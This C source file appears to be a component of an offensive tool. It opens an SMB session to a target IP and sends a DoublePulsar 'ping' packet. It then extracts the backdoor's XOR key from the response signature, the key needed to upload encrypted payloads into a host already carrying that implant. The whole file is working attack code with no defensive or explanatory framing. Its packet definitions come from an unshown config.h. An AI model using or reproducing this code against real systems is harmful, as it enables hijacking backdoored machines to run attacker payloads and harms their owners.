#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

extern SOCKET smb_connect(const char *ip, int port);

static int dp_send_all(SOCKET sock, const uint8_t *data, size_t length)
{
    size_t sent = 0;

    while (sent < length) {
        size_t remaining = length - sent;
        int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
        int result = send(sock, (const char *)data + sent, chunk, 0);
        if (result == SOCKET_ERROR || result == 0)
            return -1;
        sent += (size_t)result;
    }

    return 0;
}

static int dp_recv_frame(SOCKET sock, uint8_t **frame, size_t *frame_size)
{
    uint8_t header[4];
    size_t received = 0;
    size_t payload_size;
    uint8_t *buffer;

    while (received < sizeof(header)) {
        int result = recv(sock, (char *)header + received,
                          (int)(sizeof(header) - received), 0);
        if (result == SOCKET_ERROR || result == 0)
            return -1;
        received += (size_t)result;
    }

    payload_size = ((size_t)header[1] << 16) |
                   ((size_t)header[2] << 8) |
                   (size_t)header[3];
    if (payload_size > SIZE_MAX - sizeof(header))
        return -1;

    buffer = (uint8_t *)malloc(sizeof(header) + payload_size);
    if (buffer == NULL)
        return -1;

    memcpy(buffer, header, sizeof(header));
    received = 0;
    while (received < payload_size) {
        size_t remaining = payload_size - received;
        int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
        int result = recv(sock, (char *)buffer + sizeof(header) + received,
                          chunk, 0);
        if (result == SOCKET_ERROR || result == 0) {
            free(buffer);
            return -1;
        }
        received += (size_t)result;
    }

    *frame = buffer;
    *frame_size = sizeof(header) + payload_size;
    return 0;
}

unsigned int DoublePulsarXORKeyCalculator(const char *ip, int port)
{
    SOCKET sock = INVALID_SOCKET;
    uint8_t *negotiate = NULL;
    uint8_t *session_setup = NULL;
    uint8_t *tree_connect = NULL;
    uint8_t *ping = NULL;
    uint8_t *response = NULL;
    size_t response_size = 0;
    unsigned int key = 0;
    int success = 0;

    if (ip == NULL)
        return 0;

    sock = smb_connect(ip, port);
    if (sock == INVALID_SOCKET)
        return 0;

    negotiate = (uint8_t *)malloc(sizeof(SMB_NEGOTIATE_PKT));
    session_setup = (uint8_t *)malloc(sizeof(SMB_SESSION_SETUP_PKT));
    tree_connect = (uint8_t *)malloc(sizeof(SMB_TREE_CONNECT_PKT));
    ping = (uint8_t *)malloc(sizeof(DP_PING_PKT));
    if (negotiate == NULL || session_setup == NULL ||
        tree_connect == NULL || ping == NULL)
        goto cleanup;

    memcpy(negotiate, SMB_NEGOTIATE_PKT, sizeof(SMB_NEGOTIATE_PKT));
    memcpy(session_setup, SMB_SESSION_SETUP_PKT, sizeof(SMB_SESSION_SETUP_PKT));
    memcpy(tree_connect, SMB_TREE_CONNECT_PKT, sizeof(SMB_TREE_CONNECT_PKT));
    memcpy(ping, DP_PING_PKT, sizeof(DP_PING_PKT));

    if (dp_send_all(sock, negotiate, sizeof(SMB_NEGOTIATE_PKT) - 1) != 0 ||
        dp_recv_frame(sock, &response, &response_size) != 0)
        goto cleanup;
    free(response);
    response = NULL;

    if (dp_send_all(sock, session_setup, sizeof(SMB_SESSION_SETUP_PKT) - 1) != 0 ||
        dp_recv_frame(sock, &response, &response_size) != 0)
        goto cleanup;
    if (response_size < 34)
        goto cleanup;

    memcpy(tree_connect + 32, response + 32, 2);
    free(response);
    response = NULL;

    if (dp_send_all(sock, tree_connect, sizeof(SMB_TREE_CONNECT_PKT) - 1) != 0 ||
        dp_recv_frame(sock, &response, &response_size) != 0)
        goto cleanup;
    if (response_size < 34)
        goto cleanup;

    memcpy(ping + 28, response + 28, 2);
    memcpy(ping + 32, response + 32, 2);
    free(response);
    response = NULL;

    if (dp_send_all(sock, ping, sizeof(DP_PING_PKT) - 1) != 0 ||
        dp_recv_frame(sock, &response, &response_size) != 0)
        goto cleanup;

    if (SMB_RESP_SIGNATURE_END < SMB_RESP_SIGNATURE_START + 3 ||
        (size_t)SMB_RESP_SIGNATURE_START > response_size ||
        response_size - (size_t)SMB_RESP_SIGNATURE_START < 4)
        goto cleanup;

    key = (unsigned int)response[SMB_RESP_SIGNATURE_START] |
          ((unsigned int)response[SMB_RESP_SIGNATURE_START + 1] << 8) |
          ((unsigned int)response[SMB_RESP_SIGNATURE_START + 2] << 16) |
          ((unsigned int)response[SMB_RESP_SIGNATURE_START + 3] << 24);
    success = 1;

cleanup:
    free(response);
    free(negotiate);
    free(session_setup);
    free(tree_connect);
    free(ping);
    closesocket(sock);
    return success ? key : 0;
}